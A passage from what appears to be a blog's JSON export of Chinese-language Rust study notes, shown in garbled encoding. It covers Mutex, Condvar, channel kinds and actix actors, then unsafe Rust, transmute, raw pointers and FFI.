Mutex lockï¼Œçº¿ç¨‹åœ¨ç­‰å¾…é”çš„æ—¶å€™ä¼šè¢«è°ƒåº¦å‡ºå»ï¼Œç­‰é”å¯ç”¨æ—¶å†è¢«è°ƒåº¦å›æ¥ã€‚ çº¿ç¨‹çš„ä¸Šä¸‹æ–‡åˆ‡æ¢ä»£ä»·å¾ˆå¤§ï¼Œæ‰€ä»¥é¢‘ç¹å°†çº¿ç¨‹æŒ‚èµ·å†å”¤é†’ï¼Œä¼šé™ä½æ•´ä¸ªç³»ç»Ÿçš„æ•ˆç‡ã€‚æ‰€ä»¥å¾ˆå¤š Mutex å…·ä½“çš„å®ç°ä¼šå°† SpinLockï¼ˆç¡®åˆ‡åœ°è¯´æ˜¯ spin waitï¼‰å’Œçº¿ç¨‹æŒ‚èµ·ç»“åˆä½¿ç”¨ï¼šçº¿ç¨‹çš„ lock è¯·æ±‚å¦‚æœæ‹¿ä¸åˆ°ä¼šå…ˆå°è¯• spin ä¸€ä¼šï¼Œç„¶åå†æŒ‚èµ·æ·»åŠ åˆ°ç­‰å¾…é˜Ÿåˆ—ã€‚Rust ä¸‹çš„ parking_lot å°±æ˜¯è¿™æ ·å®ç°çš„ã€‚ å¦‚æœæ–°æ¥çš„çº¿ç¨‹æ°å·§åœ¨ spin è¿‡ç¨‹ä¸­æ‹¿åˆ°äº†é”ï¼Œè€Œå½“å‰ç­‰å¾…é˜Ÿåˆ—ä¸­è¿˜æœ‰å…¶å®ƒçº¿ç¨‹åœ¨ç­‰å¾…é”ï¼Œé‚£ä¹ˆç­‰å¾…çš„çº¿ç¨‹åªèƒ½ç»§ç»­ç­‰å¾…ä¸‹å»ï¼Œè¿™ä¸ç¬¦åˆ FIFOï¼Œä¸é€‚åˆé‚£äº›éœ€è¦ä¸¥æ ¼æŒ‰å…ˆæ¥ååˆ°æ’é˜Ÿçš„ä½¿ç”¨åœºæ™¯ã€‚ä¸ºæ­¤ï¼Œparking_lot æä¾›äº† fair mutexã€‚ Mutex çš„å®ç°ä¾èµ–äº CPU æä¾›çš„ atomicã€‚å¯ä»¥æŠŠ Mutex æƒ³è±¡æˆä¸€ä¸ªç²’åº¦æ›´å¤§çš„ atomicï¼Œåªä¸è¿‡è¿™ä¸ª atomic æ— æ³•ç”± CPU ä¿è¯ï¼Œè€Œæ˜¯é€šè¿‡è½¯ä»¶ç®—æ³•æ¥å®ç°ã€‚ Condvar Condvar æœ‰ä¸¤ç§çŠ¶æ€ï¼š ç­‰å¾…ï¼ˆwaitï¼‰ï¼šçº¿ç¨‹åœ¨é˜Ÿåˆ—ä¸­ç­‰å¾…ï¼Œç›´åˆ°æ»¡è¶³æŸä¸ªæ¡ä»¶ã€‚ é€šçŸ¥ï¼ˆnotifyï¼‰ï¼šå½“ condvar çš„æ¡ä»¶æ»¡è¶³æ—¶ï¼Œå½“å‰çº¿ç¨‹é€šçŸ¥å…¶ä»–ç­‰å¾…çš„çº¿ç¨‹å¯ä»¥è¢«å”¤é†’ã€‚ Condvar å¾€å¾€å’Œ Mutex ä¸€èµ·ä½¿ç”¨ï¼šMutex ç”¨äºä¿è¯æ¡ä»¶åœ¨è¯»å†™æ—¶äº’æ–¥ï¼ŒCondvar ç”¨äºæ§åˆ¶çº¿ç¨‹çš„ç­‰å¾…å’Œå”¤é†’ã€‚ 123456789101112131415161718192021222324252627282930use std::sync::&#123;Arc, Condvar, Mutex&#125;;use std::thread;use std::time::Duration;fn main() &#123; let pair = Arc::new((Mutex::new(false), Condvar::new())); let pair2 = Arc::clone(&amp;pair); thread::spawn(move || &#123; let (lock, cvar) = &amp;*pair2; let mut started = lock.lock().unwrap(); *started = true; eprintln!(\"I'm a happy worker!\"); // é€šçŸ¥ä¸»çº¿ç¨‹ cvar.notify_one(); loop &#123; thread::sleep(Duration::from_secs(1)); println!(\"working...\"); &#125; &#125;); // ç­‰å¾…å·¥ä½œçº¿ç¨‹çš„é€šçŸ¥ let (lock, cvar) = &amp;*pair; let mut started = lock.lock().unwrap(); while !*started &#123; // å”¤é†’å“ªä¸ª Mutex ä¸‹ç­‰å¾…çš„çº¿ç¨‹ started = cvar.wait(started).unwrap(); &#125; eprintln!(\"Worker started!\");&#125; Channel Channel æŠŠé”å°è£…åœ¨äº†é˜Ÿåˆ—å†™å…¥å’Œè¯»å–çš„å°å—åŒºåŸŸå†…ï¼Œç„¶åæŠŠè¯»è€…å’Œå†™è€…å®Œå…¨åˆ†ç¦»ï¼Œä½¿å¾—è¯»è€…è¯»å–æ•°æ®å’Œå†™è€…å†™å…¥æ•°æ®ï¼Œå¯¹å¼€å‘è€…è€Œè¨€ï¼Œé™¤äº†æ½œåœ¨çš„ä¸Šä¸‹æ–‡åˆ‡æ¢å¤–ï¼Œå®Œå…¨å’Œé”æ— å…³ï¼Œå°±åƒè®¿é—®ä¸€ä¸ªæœ¬åœ°é˜Ÿåˆ—ä¸€æ ·ã€‚å¯¹äºå¤§éƒ¨åˆ†å¹¶å‘é—®é¢˜ï¼Œéƒ½å¯ä»¥ç”¨ Channel æˆ–è€…ç±»ä¼¼çš„æ€æƒ³æ¥å¤„ç†ï¼ˆæ¯”å¦‚ actor modelï¼‰ã€‚ Rust æä¾›äº†ä»¥ä¸‹å››ç§ Channelï¼š oneshotï¼šè¿™å¯èƒ½æ˜¯æœ€ç®€å•çš„ Channelï¼Œå†™è€…å°±åªå‘ä¸€æ¬¡æ•°æ®ï¼Œè€Œè¯»è€…ä¹Ÿåªè¯»ä¸€æ¬¡ã€‚ rendezvousï¼šé€‚ç”¨äºåªéœ€è¦é€šè¿‡ Channel æ¥æ§åˆ¶çº¿ç¨‹é—´çš„åŒæ­¥ï¼Œå¹¶ä¸éœ€è¦å‘é€æ•°æ®ã€‚rendezvous channel æ˜¯ channel size ä¸º 0 çš„ä¸€ç§ç‰¹æ®Šæƒ…å†µã€‚rendezvous channel å…¶å®ä¹Ÿå°±æ˜¯ Mutex + Condvar çš„ä¸€ä¸ªåŒ…è£…ã€‚ boundedï¼šbounded channel æœ‰ä¸€ä¸ªé˜Ÿåˆ—ï¼Œä½†é˜Ÿåˆ—æœ‰ä¸Šé™ã€‚ä¸€æ—¦é˜Ÿåˆ—è¢«å†™æ»¡äº†ï¼Œå†™è€…ä¹Ÿéœ€è¦è¢«æŒ‚èµ·ç­‰å¾…ã€‚å½“é˜»å¡å‘ç”Ÿåï¼Œè¯»è€…ä¸€æ—¦è¯»å–æ•°æ®ï¼Œchannel å†…éƒ¨å°±ä¼šä½¿ç”¨ Condvar çš„ notify_one é€šçŸ¥å†™è€…ï¼Œå”¤é†’æŸä¸ªå†™è€…ä½¿å…¶èƒ½å¤Ÿç»§ç»­å†™å…¥ã€‚ &gt; ä¸€èˆ¬ä¼šç”¨åˆ° Mutex + Condvar + VecDeque æ¥å®ç°ï¼›å¦‚æœä¸ç”¨ Condvarï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ thread::park + thread::notify æ¥å®Œæˆï¼ˆflume çš„åšæ³•ï¼‰ï¼›å¦‚æœä¸ç”¨ VecDequeï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨åŒå‘é“¾è¡¨æˆ–è€…å…¶å®ƒçš„ ring buffer çš„å®ç°ã€‚ unboundedï¼šqueue æ²¡æœ‰ä¸Šé™ï¼Œå¦‚æœå†™æ»¡äº†ï¼Œå°±è‡ªåŠ¨æ‰©å®¹ã€‚æˆ‘ä»¬çŸ¥é“ï¼ŒRust çš„å¾ˆå¤šæ•°æ®ç»“æ„å¦‚ Vec ã€VecDeque éƒ½æ˜¯è‡ªåŠ¨æ‰©å®¹çš„ã€‚unbounded å’Œ bounded ç›¸æ¯”ï¼Œé™¤äº†ä¸é˜»å¡å†™è€…ï¼Œå…¶å®ƒå®ç°éƒ½å¾ˆç±»ä¼¼ã€‚ æ‰€æœ‰è¿™äº› channel ç±»å‹ï¼ŒåŒæ­¥å’Œå¼‚æ­¥çš„å®ç°æ€è·¯å¤§åŒå°å¼‚ï¼Œä¸»è¦çš„åŒºåˆ«åœ¨äºæŒ‚èµ·/å”¤é†’çš„å¯¹è±¡ã€‚åœ¨åŒæ­¥çš„ä¸–ç•Œé‡Œï¼ŒæŒ‚èµ·/å”¤é†’çš„å¯¹è±¡æ˜¯çº¿ç¨‹ï¼›è€Œå¼‚æ­¥çš„ä¸–ç•Œé‡Œï¼Œæ˜¯ç²’åº¦å¾ˆå°çš„ taskã€‚ æ ¹æ® Channel è¯»è€…å’Œå†™è€…çš„æ•°é‡ï¼ŒChannel åˆå¯ä»¥åˆ†ä¸ºï¼š SPSCï¼šSingle-Producer Single-Consumerï¼Œå•ç”Ÿäº§è€…ï¼Œå•æ¶ˆè´¹è€…ã€‚æœ€ç®€å•ï¼Œå¯ä»¥ä¸ä¾èµ–äº Mutexï¼Œåªç”¨ atomics å°±å¯ä»¥å®ç°ã€‚ SPMCï¼šSingle-Producer Multi-Consumerï¼Œå•ç”Ÿäº§è€…ï¼Œå¤šæ¶ˆè´¹è€…ã€‚éœ€è¦åœ¨æ¶ˆè´¹è€…è¿™ä¾§è¯»å–æ—¶åŠ é”ã€‚ MPSCï¼šMulti-Producer Single-Consumerï¼Œå¤šç”Ÿäº§è€…ï¼Œå•æ¶ˆè´¹è€…ã€‚éœ€è¦åœ¨ç”Ÿäº§è€…è¿™ä¾§å†™å…¥æ—¶åŠ é”ã€‚ MPMCï¼šMulti-Producer Multi-Consumerã€‚å¤šç”Ÿäº§è€…ï¼Œå¤šæ¶ˆè´¹è€…ã€‚éœ€è¦åœ¨ç”Ÿäº§è€…å†™å…¥æˆ–è€…æ¶ˆè´¹è€…è¯»å–æ—¶åŠ é”ã€‚ åœ¨ä¼—å¤š Channel ç±»å‹ä¸­ï¼Œä½¿ç”¨æœ€å¹¿çš„æ˜¯ MPSC channelï¼Œå¤šç”Ÿäº§è€…ï¼Œå•æ¶ˆè´¹è€…ã€‚é€šè¿‡å•æ¶ˆè´¹è€…æ¥ä¿è¯ï¼Œæ¶ˆæ¯çš„æ•°æ®ç»“æ„æœ‰ç‹¬å çš„å†™è®¿é—®ã€‚ Actor actor æ˜¯ä¸€ç§æœ‰æ ˆåç¨‹ã€‚æ¯ä¸ª actorï¼Œæœ‰è‡ªå·±çš„ä¸€ä¸ªç‹¬ç«‹çš„ã€è½»é‡çº§çš„è°ƒç”¨æ ˆï¼Œä»¥åŠä¸€ä¸ªç”¨æ¥æ¥å—æ¶ˆæ¯çš„æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆmailbox æˆ–è€… message queueï¼‰ï¼Œå¤–ç•Œè·Ÿ actor æ‰“äº¤é“çš„å”¯ä¸€æ‰‹æ®µå°±æ˜¯ï¼Œç»™å®ƒå‘é€æ¶ˆæ¯ã€‚ Rust æ ‡å‡†åº“æ²¡æœ‰ actor çš„å®ç°ï¼Œä½†æ˜¯ç¤¾åŒºé‡Œæœ‰æ¯”è¾ƒæˆç†Ÿçš„ actixï¼Œä»¥åŠ bastionã€‚ ä¸€ä¸ªç¤ºä¾‹ Actor å®ç°ä¸ºï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051use actix::prelude::*;use anyhow::Result;#[derive(Message, Debug, Clone, PartialEq)]#[rtype(result = \"OutMsg\")]enum InMsg &#123; Add((usize, usize)), Concat((String, String)),&#125;#[derive(MessageResponse, Debug, Clone, PartialEq)]enum OutMsg &#123; Num(usize), Str(String),&#125;// Actorstruct DummyActor;// åªéœ€è¦å®ç° Actor traitå’ŒHandler&lt;InMsg&gt; traitimpl Actor for DummyActor &#123; type Context = Context&lt;Self&gt;;&#125;// å®ç°å¤„ç† InMsg çš„ Handler traitimpl Handler&lt;InMsg&gt; for DummyActor &#123; type Result = OutMsg; // &lt;- è¿”å›çš„æ¶ˆæ¯ fn handle(&amp;mut self, msg: InMsg, _ctx: &amp;mut Self::Context) -&gt; Self::Result &#123; match msg &#123; InMsg::Add((a, b)) =&gt; OutMsg::Num(a + b), InMsg::Concat((mut s1, s2)) =&gt; &#123; s1.push_str(&amp;s2); OutMsg::Str(s1) &#125; &#125; &#125;&#125;#[actix::main]async fn main() -&gt; Result&lt;()&gt; &#123; let addr = DummyActor.start(); let res = addr.send(InMsg::Add((21, 21))).await?; let res1 = addr .send(InMsg::Concat((\"hello, \".into(), \"world\".into()))) .await?; println!(\"res: &#123;:?&#125;, res1: &#123;:?&#125;\", res, res1); Ok(())&#125; å°ç»“ Atomic åœ¨å¤„ç†ç®€å•çš„åŸç”Ÿç±»å‹æ—¶éå¸¸æœ‰ç”¨ï¼Œå¦‚æœä½ å¯ä»¥é€šè¿‡ AtomicXXX ç»“æ„è¿›è¡ŒåŒæ­¥ï¼Œé‚£ä¹ˆå®ƒä»¬æ˜¯æœ€å¥½çš„é€‰æ‹©ã€‚ å½“ä½ çš„æ•°æ®ç»“æ„æ— æ³•ç®€å•é€šè¿‡ AtomicXXX è¿›è¡ŒåŒæ­¥ï¼Œä½†ä½ åˆçš„ç¡®éœ€è¦åœ¨å¤šä¸ªçº¿ç¨‹ä¸­å…±äº«æ•°æ®ï¼Œé‚£ä¹ˆ Mutex / RwLock å¯ä»¥æ˜¯ä¸€ç§é€‰æ‹©ã€‚ä¸è¿‡ï¼Œéœ€è¦è€ƒè™‘é”çš„ç²’åº¦ï¼Œç²’åº¦å¤ªå¤§çš„ Mutex / RwLock æ•ˆç‡å¾ˆä½ã€‚ å¦‚æœæœ‰ N ä»½èµ„æºå¯ä»¥ä¾›å¤šä¸ªå¹¶å‘ä»»åŠ¡ç«äº‰ä½¿ç”¨ï¼Œé‚£ä¹ˆï¼ŒSemaphore æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„é€‰æ‹©ã€‚æ¯”å¦‚åšä¸€ä¸ª DB è¿æ¥æ± ã€‚ å½“éœ€è¦åœ¨å¹¶å‘ä»»åŠ¡ä¸­é€šçŸ¥ã€åä½œæ—¶ï¼ŒCondvar æä¾›äº†æœ€åŸºæœ¬çš„é€šçŸ¥æœºåˆ¶ï¼Œè€ŒChannel æŠŠè¿™ä¸ªé€šçŸ¥æœºåˆ¶è¿›ä¸€æ­¥å¹¿æ³›æ‰©å±•å¼€ã€‚å¯ä»¥ç”¨ Condvar è¿›è¡Œç‚¹å¯¹ç‚¹çš„åŒæ­¥ï¼Œç”¨ Channel åšä¸€å¯¹å¤šã€å¤šå¯¹ä¸€ã€å¤šå¯¹å¤šçš„åŒæ­¥ã€‚ åšå¤§éƒ¨åˆ†å¤æ‚çš„ç³»ç»Ÿè®¾è®¡æ—¶ï¼ŒChannel å¾€å¾€æ˜¯æœ€æœ‰åŠ›çš„æ­¦å™¨ï¼Œé™¤äº†å¯ä»¥è®©æ•°æ®ç©¿æ¢­äºå„ä¸ªçº¿ç¨‹ã€å„ä¸ªå¼‚æ­¥ä»»åŠ¡é—´ï¼Œå®ƒçš„æ¥å£è¿˜å¯ä»¥å¾ˆä¼˜é›…åœ°è·Ÿ stream é€‚é…ã€‚ åœ¨åšæ•´ä¸ªåç«¯çš„ç³»ç»Ÿæ¶æ„æ—¶ï¼Œç€çœ¼çš„æ˜¯ï¼šæœ‰å“ªäº›æœåŠ¡ã€æœåŠ¡å’ŒæœåŠ¡ä¹‹é—´å¦‚ä½•é€šè®¯ã€æ•°æ®å¦‚ä½•æµåŠ¨ã€æœåŠ¡å’ŒæœåŠ¡é—´å¦‚ä½•åŒæ­¥ã€‚åœ¨åšæŸä¸€ä¸ªæœåŠ¡çš„æ¶æ„æ—¶ï¼Œç€çœ¼çš„æ˜¯æœ‰å“ªäº›åŠŸèƒ½æ€§çš„çº¿ç¨‹ï¼ˆå¼‚æ­¥ä»»åŠ¡ï¼‰ã€å®ƒä»¬ä¹‹é—´çš„æ¥å£æ˜¯ä»€ä¹ˆæ ·å­ã€æ•°æ®å¦‚ä½•æµåŠ¨ã€å¦‚ä½•åŒæ­¥ã€‚ è€Œ Channel å…¼å…·æ¥å£ã€åŒæ­¥å’Œæ•°æ®æµä¸‰ç§åŠŸèƒ½ã€‚ Rust æä¾›å‡ ä¹ä½ éœ€è¦çš„æ‰€æœ‰è§£å†³æ–¹æ¡ˆï¼Œå¯æŒ‰éœ€é€‰æ‹©ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Rust","slug":"Notes/Rust","permalink":"https://racleray.github.io/categories/Notes/Rust/"}],"tags":[{"name":"Rust","slug":"Rust","permalink":"https://racleray.github.io/tags/Rust/"}],"author":"HeRui"},{"title":"RUST Part4","slug":"RUST-part4","date":"2024-11-14T11:03:25.564Z","updated":"2024-11-14T13:07:00.694Z","comments":true,"path":"posts/eb2aad59.html","link":"","permalink":"https://racleray.github.io/posts/eb2aad59.html","excerpt":"Rust Notes","text":"Unsafe Rust è®¡ç®—æœºç¡¬ä»¶æœ¬èº«æ˜¯ unsafe çš„ï¼Œæ¯”å¦‚æ“ä½œ IO è®¿é—®å¤–è®¾ï¼Œæˆ–è€…ä½¿ç”¨æ±‡ç¼–æŒ‡ä»¤è¿›è¡Œç‰¹æ®Šæ“ä½œï¼ˆæ“ä½œ GPUæˆ–è€…ä½¿ç”¨ SSE æŒ‡ä»¤é›†ï¼‰ã€‚å› ä¸ºè¿™äº›æ“ä½œï¼Œç¼–è¯‘å™¨æ˜¯æ— æ³•ä¿è¯å†…å­˜å®‰å…¨çš„ã€‚å½“ Rust è¦è®¿é—®å…¶å®ƒè¯­è¨€æ¯”å¦‚ C/C++ çš„åº“ï¼Œå› ä¸ºå®ƒä»¬å¹¶ä¸æ»¡è¶³ Rust çš„å®‰å…¨æ€§è¦æ±‚ï¼Œè¿™ç§è·¨è¯­è¨€çš„ FFIï¼ˆForeign Function Interfaceï¼‰ï¼Œä¹Ÿæ˜¯ unsafe çš„ã€‚ä¸€èˆ¬ä½¿ç”¨åœºæ™¯æœ‰ï¼š å®ç° unsafe trait è°ƒç”¨å·²æœ‰ unsafe æ¥å£ è£¸æŒ‡é’ˆè§£å¼•ç”¨ unsafe trait 12pub unsafe auto trait Send &#123;&#125;pub unsafe auto trait Sync &#123;&#125; ç»å¤§å¤šæ•°æ•°æ®ç»“æ„éƒ½å®ç°äº† Send / Syncï¼Œä½†æœ‰ä¸€äº›ä¾‹å¤–ï¼Œæ¯”å¦‚ Rc / RefCell / è£¸æŒ‡é’ˆ ç­‰ã€‚Send / Sync æ˜¯ auto traitï¼Œæ‰€ä»¥å¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œä¸éœ€è¦å®ç° Send / Syncï¼Œç„¶è€Œï¼Œåœ¨æ•°æ®ç»“æ„é‡Œä½¿ç”¨è£¸æŒ‡é’ˆæ—¶ï¼Œå› ä¸ºè£¸æŒ‡é’ˆæ˜¯æ²¡æœ‰å®ç° Send/Sync çš„ï¼Œæ•´ä¸ªæ•°æ®ç»“æ„ä¹Ÿå°±æ²¡æœ‰å®ç° Send/Syncã€‚ å¦‚æœèƒ½ä¿è¯æŒ‡é’ˆå¯ä»¥åœ¨çº¿ç¨‹ä¸­å®‰å…¨ç§»åŠ¨ï¼Œé‚£ä¹ˆå¯å®ç°æ•°æ®ç»“æ„çš„ Send traitï¼›å¦‚æœå¯ä»¥ä¿è¯æŒ‡é’ˆèƒ½åœ¨çº¿ç¨‹ä¸­å®‰å…¨åœ°å…±äº«ï¼Œé‚£ä¹ˆå¯å®ç° Sync traitã€‚ åœ¨å®ç° Send/Sync çš„æ—¶å€™ï¼Œå¦‚æœä½ æ— æ³•ä¿è¯æ•°æ®ç»“æ„çš„çº¿ç¨‹å®‰å…¨ï¼Œé”™è¯¯å®ç° Send/Syncä¹‹åï¼Œä¼šå¯¼è‡´ç¨‹åºå‡ºç°è«åå…¶å¦™çš„è¿˜ä¸å¤ªå®¹æ˜“å¤ç°çš„å´©æºƒã€‚ ä»»ä½• traitï¼Œåªè¦å£°æ˜æˆ unsafeï¼Œå®ƒå°±æ˜¯ä¸€ä¸ª unsafe traitã€‚è€Œä¸€ä¸ªæ­£å¸¸çš„ trait é‡Œä¹Ÿå¯ä»¥åŒ…å« unsafe å‡½æ•°ã€‚ 1234567891011121314151617181920212223242526272829303132// å®ç°è¿™ä¸ª trait çš„å¼€å‘è€…è¦ä¿è¯å®ç°æ˜¯å†…å­˜å®‰å…¨çš„unsafe trait Foo &#123; fn foo(&amp;self);&#125;trait Bar &#123; // è°ƒç”¨è¿™ä¸ªå‡½æ•°çš„äººè¦ä¿è¯è°ƒç”¨æ˜¯å®‰å…¨çš„ unsafe fn bar(&amp;self);&#125;struct Nonsense;unsafe impl Foo for Nonsense &#123; fn foo(&amp;self) &#123; println!(\"foo!\"); &#125;&#125;impl Bar for Nonsense &#123; unsafe fn bar(&amp;self) &#123; println!(\"bar!\"); &#125;&#125;fn main() &#123; let nonsense = Nonsense; // è°ƒç”¨è€…æ— éœ€å…³å¿ƒ safety nonsense.foo(); // è°ƒç”¨è€…éœ€è¦ä¸º safety è´Ÿè´£ unsafe &#123; nonsense.bar() &#125;;&#125; unsafe trait æ˜¯å¯¹ trait çš„å®ç°è€…çš„çº¦æŸã€‚unsafe fn æ˜¯å‡½æ•°å¯¹è°ƒç”¨è€…çš„çº¦æŸã€‚ è°ƒç”¨å·²æœ‰çš„ unsafe å‡½æ•° æ¯”å¦‚ï¼Œmemory transmuteï¼š 1234567fn explain&lt;K, V&gt;(name: &amp;str, map: HashMap&lt;K, V&gt;) -&gt; HashMap&lt;K, V&gt; &#123; let arr: [usize; 6] = unsafe &#123; std::mem::transmute(map) &#125;; // show as arr show_arr(&amp;arr); // transmute to map unsafe &#123; std::mem::transmute(arr) &#125;&#125; å¸¦åˆæ³•æ€§æ ¡éªŒçš„å‡½æ•°å’Œä¸å¸¦åˆæ³•æ€§æ ¡éªŒçš„å‡½æ•°ï¼š 1234567891011pub fn from_utf8(v: &amp;[u8]) -&gt; Result&lt;&amp;str, Utf8Error&gt; &#123; run_utf8_validation(v)?; // SAFETY: Just ran validation. Ok(unsafe &#123; from_utf8_unchecked(v) &#125;)&#125;pub const unsafe fn from_utf8_unchecked(v: &amp;[u8]) -&gt; &amp;str &#123; // SAFETY: the caller must guarantee that the bytes `v` are valid UTF-8. // Also relies on `&amp;str` and `&amp;[u8]` having the same layout. unsafe &#123; mem::transmute(v) &#125;&#125; å¦‚æœä½ æ¸…æ¥šåœ°çŸ¥é“ï¼Œ&amp;[u8] ä½ ä¹‹å‰å·²ç»åšè¿‡æ£€æŸ¥ï¼Œæˆ–è€…å®ƒæœ¬èº«å°±æ¥æºäºä½ ä» &amp;str è½¬æ¢æˆçš„ &amp;[u8]ï¼Œç°åœ¨åªä¸è¿‡å†è½¬æ¢å›å»ï¼Œé‚£å¯ä»¥è°ƒç”¨ä¸å®‰å…¨çš„ç‰ˆæœ¬ï¼Œå¹¶åœ¨æ³¨é‡Šä¸­æ³¨æ˜ä¸ºä»€ä¹ˆè¿™é‡Œæ˜¯å®‰å…¨çš„ã€‚ è£¸æŒ‡é’ˆè§£å¼•ç”¨ è£¸æŒ‡é’ˆåœ¨ç”Ÿæˆçš„æ—¶å€™æ— éœ€ unsafeï¼Œå› ä¸ºå®ƒå¹¶æ²¡æœ‰å†…å­˜ä¸å®‰å…¨çš„æ“ä½œï¼Œä½†è£¸æŒ‡é’ˆçš„è§£å¼•ç”¨æ“ä½œæ˜¯ä¸å®‰å…¨çš„ï¼Œæ½œåœ¨æœ‰é£é™©ï¼Œå®ƒä¹Ÿéœ€è¦ä½¿ç”¨ unsafe æ¥æ˜ç¡®å‘Šè¯‰ç¼–è¯‘å™¨ã€‚ ä½¿ç”¨è£¸æŒ‡é’ˆï¼Œå¯å˜æŒ‡é’ˆå’Œä¸å¯å˜æŒ‡é’ˆå¯ä»¥å…±å­˜ï¼Œä¸åƒå¯å˜å¼•ç”¨å’Œä¸å¯å˜å¼•ç”¨æ— æ³•å…±å­˜ã€‚ä½¿ç”¨è£¸æŒ‡é’ˆæ—¶ï¼Œéœ€è¦æ³¨æ„æŒ‡é’ˆæ˜¯å¦æ¥æºäºåˆæ³•çš„å†…å­˜åœ°å€ã€‚ å¯ä»¥å‚ç…§ std::ptr æ–‡æ¡£å­¦ä¹ ã€‚ ä½¿ç”¨ FFI å½“ Rust è¦ä½¿ç”¨å…¶å®ƒè¯­è¨€çš„èƒ½åŠ›æ—¶ï¼ŒRust ç¼–è¯‘å™¨å¹¶ä¸èƒ½ä¿è¯é‚£äº›è¯­è¨€å…·å¤‡å†…å­˜å®‰å…¨ï¼Œæ‰€ä»¥å’Œç¬¬ä¸‰æ–¹è¯­è¨€äº¤äº’çš„æ¥å£ï¼Œä¸€å¾‹è¦ä½¿ç”¨ unsafeã€‚ 123456789101112131415use std::mem::transmute;fn main() &#123; let data = unsafe &#123; let p = libc::malloc(8); let arr: &amp;mut [u8; 8] = transmute(p); arr &#125;; data.copy_from_slice(&amp;[1, 2, 3, 4, 5, 6, 7, 8]); println!(\"data: &#123;:?&#125;\", data); unsafe &#123; libc::free(transmute(data)) &#125;;&#125; ä¸æ¨èä½¿ç”¨ unsafe çš„åœºæ™¯ æ¯”å¦‚å¤„ç†æœªåˆå§‹åŒ–æ•°æ®ã€è®¿é—®å¯å˜é™æ€å˜é‡ã€ä½¿ç”¨ unsafe æå‡æ€§èƒ½ã€‚ Rust æ”¯æŒå¯å˜çš„ static å˜é‡ï¼Œå¯ä»¥ä½¿ç”¨ static mut æ¥å£°æ˜ã€‚å…¨å±€å˜é‡å¦‚æœå¯å†™ï¼Œä¼šæ½œåœ¨æœ‰çº¿ç¨‹ä¸å®‰å…¨çš„é£é™©ï¼Œæ‰€ä»¥å¦‚æœä½ å£°æ˜ static mut å˜é‡ï¼Œåœ¨è®¿é—®æ—¶ï¼Œç»Ÿç»Ÿéƒ½éœ€è¦ä½¿ç”¨ unsafeã€‚ä½¿ç”¨ Mutexã€Atom ä½œä¸ºæ›¿ä»£æ˜¯æ›´å¥½çš„é€‰æ‹©ã€‚ åœ¨å®å®šä¹‰ä¸­è§†åŒ unsafe ï¼Œä¸€ä¸ªé—®é¢˜å°±æ˜¯ä¸æ˜“è¢«ä½¿ç”¨è€…å¯Ÿè§‰ï¼Œä½¿ç”¨è€…çš„è´Ÿæ‹…è¾ƒå¤§ï¼Œä»¥åŠæ½œåœ¨é—®é¢˜ä¸å®¹æ˜“å‘ç°ã€‚ ä½¿ç”¨ unsafe ä»£ç æ¥ä¼˜åŒ–æ€§èƒ½ï¼Œæ¯”å¦‚ unsafe { BitMask(x86::_mm_movemask_epi8(self.0) as u16) } SIMD åŠ é€Ÿï¼Œå±äºæ¯”è¾ƒç»†èŠ‚çš„ç‚¹ã€‚ä¸€èˆ¬è€Œè¨€ä¸æ˜¯åœ¨æ€§èƒ½çš„å…³é”®è·¯å¾„ä¸‹ï¼Œæ²¡æœ‰å¤ªå¤§å¿…è¦ï¼Œå½“ç„¶ä¹Ÿä¸æ˜¯ä¸è¡Œã€‚å¦‚æœå¯¹è‡ªå·±è€Œè¨€ï¼Œå®ç°è¿™ç§ä»£ç æ˜¯ä¸€ç§è´Ÿæ‹…ï¼Œè¿™ç§ç»†èŠ‚é—®é¢˜ï¼Œè¿˜æ˜¯åœ¨å®ƒæˆä¸ºä¸€ä¸ªå…³é”®é—®é¢˜æ—¶å†è€ƒè™‘ä¹Ÿä¸è¿Ÿã€‚ FFI Foreign Function Interface å±äºæ¯”è¾ƒåº•å±‚çš„å†…å®¹ã€‚Python ä¸­çš„ numpyï¼ŒRust ä¸­çš„ OpenSSL ï¼Œéƒ½æ˜¯å¸¸ç”¨çš„ä½¿ç”¨ C ä½œä¸ºåº•å±‚å®ç°çš„åº“ã€‚ å½“ç„¶ç°åœ¨ä¹Ÿæœ‰ä½¿ç”¨ Rust ä½œä¸ºåº•å±‚çš„ C/C++ åº“ï¼Œæ¯”å¦‚ quiche å’Œ Rustlsã€‚é™¤äº†ç”¨ C/C++ åšåº•å±‚å¤–ï¼Œè¶Šæ¥è¶Šå¤šçš„åº“ä¼šå…ˆç”¨ Rust å®ç°ï¼Œå†æ„å»ºå‡ºå¯¹åº” Pythonï¼ˆpyo3ï¼‰ã€JavaScriptï¼ˆwasmï¼‰ã€Node.jsï¼ˆneonï¼‰ã€Swiftï¼ˆuniffiï¼‰ã€Kotlinï¼ˆuniffiï¼‰ç­‰å®ç°ã€‚ Rust ä½¿ç”¨ C/C++ åº“ï¼Œå¯ä»¥ä½¿ç”¨ bindgen ç”Ÿæˆ Rust FFI ä»£ç ã€‚ä½¿ç”¨ FFI çš„ç¤ºä¾‹é¡¹ç›®å¯å‚è€ƒ Rust-RocksDB æ³¨æ„äº‹é¡¹ C string æ˜¯ NULL ç»“å°¾ï¼Œä¸ Rust String æ˜¯ä¸åŒçš„ç»“æ„ã€‚Rust æä¾›äº† std::ffi æ¥å¤„ç†è¿™æ ·çš„é—®é¢˜ï¼Œæ¯”å¦‚ CStr å’Œ CString æ¥å¤„ç†å­—ç¬¦ä¸²ã€‚ Rust çš„å†…å­˜åˆ†é…å™¨å’Œå…¶å®ƒè¯­è¨€çš„å¯èƒ½ä¸ä¸€æ ·ï¼Œæ‰€ä»¥ï¼ŒRust åˆ†é…çš„å†…å­˜åœ¨ C çš„ä¸Šä¸‹æ–‡ä¸­é‡Šæ”¾ï¼Œå¯èƒ½ä¼šå¯¼è‡´æœªå®šä¹‰çš„è¡Œä¸ºã€‚ ä½¿ç”¨ thiserror æˆ–è€…ç±»ä¼¼çš„æœºåˆ¶æ¥å®šä¹‰æ‰€æœ‰ C è¯­è¨€ä¸­ error code å¯¹åº”çš„é”™è¯¯æƒ…å†µã€‚ Rust ç¼–è¯‘ä¸º C è¦æŠŠ Rust ä»£ç 